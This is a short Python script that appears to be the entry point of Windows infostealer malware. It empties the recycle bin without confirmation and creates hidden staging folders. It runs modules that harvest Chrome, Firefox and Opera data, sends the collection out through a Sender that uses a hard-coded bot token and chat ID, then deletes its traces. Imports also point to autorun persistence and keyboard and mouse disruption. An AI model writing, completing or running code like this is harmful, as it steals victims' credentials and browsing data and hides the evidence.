import os
import winshell
import shutil
from modules.Autorun.setrun import Setrun

from modules.controllers.register import Register
from modules.controllers.DudosWithTxt import Desktop  

from modules.headset.keyboard.CrashKeyboard import CrashKeyboard
from modules.headset.mouse.CrashMouse import CrashMouse
from modules.headset.mouse.crazy import CrazyMouse

from modules.other.sender import Sender

from modules.Sound.music import Sound

from modules.WEB.chrome import Chrome
from modules.WEB.firefox import Firefox
from modules.WEB.opera import Opera
from modules.WEB.WebController import WEB


token = '5311713070:AAEypgx8W6KE_5v_oAeo8-KX8QVIxYqPIY0'
chat_id = "1434743208"

try:
    os.remove('C://asd/mamont')
    winshell.recycle_bin().empty(confirm=False, show_progress=False, sound=False)
    os.makedirs('C://MonzeN')
    os.makedirs('C://MonzeN/log')
    os.makedirs('C://MonzeN/Chrome')
    os.makedirs('C://MonzeN/Firefox')
    os.makedirs('C://MonzeN/Opera')
    os.makedirs('C://MonzeN/SystemInformation')
except:
    try:
        winshell.recycle_bin().empty(confirm=False, show_progress=False, sound=False)
    except:
        pass





try:
    Chrome.chrome()
    Firefox.firefox()
    Opera.opera()

    Sender.sender(token,chat_id)
    shutil.rmtree('C://MonzeN')
    os.remove('C://asd/mamont')
except:
    pass